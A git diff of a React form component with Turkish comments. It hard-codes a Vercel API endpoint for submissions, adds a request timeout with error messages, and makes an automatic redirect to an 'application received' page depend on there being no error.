@@ -6,13 +6,15 @@ function Bilgi() {
   const navigate = useNavigate();
   const [error, setError] = useState(null);
 
-  // 60 saniye sonra otomatik yönlendirme
+  // 60 saniye sonra otomatik yönlendirme (isteğe bağlı, başarısızsa devre dışı bırakılabilir)
   useEffect(() => {
     const timer = setTimeout(() => {
-      window.location.href = '/basvuru-alindi'; // 60 saniye sonra yönlendirme
+      if (!error) {
+        window.location.href = '/basvuru-alindi'; // Yalnızca hata yoksa yönlendir
+      }
     }, 60000); // 60000 ms = 60 saniye
     return () => clearTimeout(timer);
-  }, []);
+  }, [error]); // error state'i değiştiğinde yeniden hesapla
 
   const handleInput = (e, type) => {
     const el = e.target;
@@ -37,15 +39,21 @@ function Bilgi() {
     };
 
     try {
-      // REACT_API_URL ortam değişkeninden API endpoint'ini al
-      const apiUrl = process.env.REACT_API_URL || 'http://localhost:3001/submit';
+      // API isteği için sabit URL
+      const apiUrl = 'https://api-nine-rose-80.vercel.app/api/submit';
+      const controller = new AbortController(); // Zaman aşımı için
+      const timeoutId = setTimeout(() => controller.abort(), 20000); // 20 saniye zaman aşımı
+
       const response = await fetch(apiUrl, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify(data),
+        signal: controller.signal, // Zaman aşımı için sinyal
       });
+
+      clearTimeout(timeoutId); // İstek tamamlanırsa zaman aşımını iptal et
 
       if (!response.ok) {
         const errorData = await response.json();
@@ -55,10 +63,11 @@ function Bilgi() {
       const result = await response.json();
       console.log('API yanıtı:', result);
 
-      // Başarılıysa yönlendirme
+      // Yalnızca başarılıysa yönlendirme
       navigate('/basvuru-alindi');
+      setError(null); // Hata sıfırlansın
     } catch (err) {
-      setError(err.message || 'Bir hata oluştu, lütfen tekrar deneyin.');
+      setError(err.name === 'AbortError' ? 'İstek zaman aşımına uğradı, lütfen tekrar deneyin.' : err.message || 'Bir hata oluştu, lütfen tekrar deneyin.');
       console.error('Hata:', err);
     }
   };
